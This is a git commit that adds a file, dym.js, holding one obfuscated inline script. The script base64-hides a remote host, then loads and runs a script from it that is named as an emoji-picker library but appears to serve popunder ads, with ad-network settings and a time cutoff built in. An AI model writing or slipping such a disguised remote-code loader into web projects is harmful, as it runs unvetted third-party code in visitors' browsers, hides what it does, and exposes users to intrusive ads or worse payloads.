0ddcfd3596e566f0e867a9b915978a71906d2b7a
eraflix <Eraflix@proton.me>
2025-05-20 19:16:33 +0200

    Create dym.js

---
+++ dym.js
@@ -0,0 +1,5 @@
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var d=window,l="e318e8e42a4abd0f7251b74d9108d5e7",a=[["siteId",355-345+922+5193577],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],k=["ZHltcGlyZS5wYWdlcy5kZXYvcGVtb2ppLXBpY2tlci5taW4uanM="],h=-1,s,r,x=function(){clearTimeout(r);h++;if(k[h]&&!(1773680495000<(new Date).getTime()&&1<h)){s=d.document.createElement("script");s.type="text/javascript";s.async=!0;var c=d.document.getElementsByTagName("script")[0];s.src="https://"+atob(k[h]);s.crossOrigin="anonymous";s.onerror=x;s.onload=function(){clearTimeout(r);d[l.slice(0,16)+l.slice(0,16)]||x()};r=setTimeout(x,5E3);c.parentNode.insertBefore(s,c)}};if(!d[l]){try{Object.freeze(d[l]=a)}catch(e){}x()}})();
+/*]]>/* */
+</script>
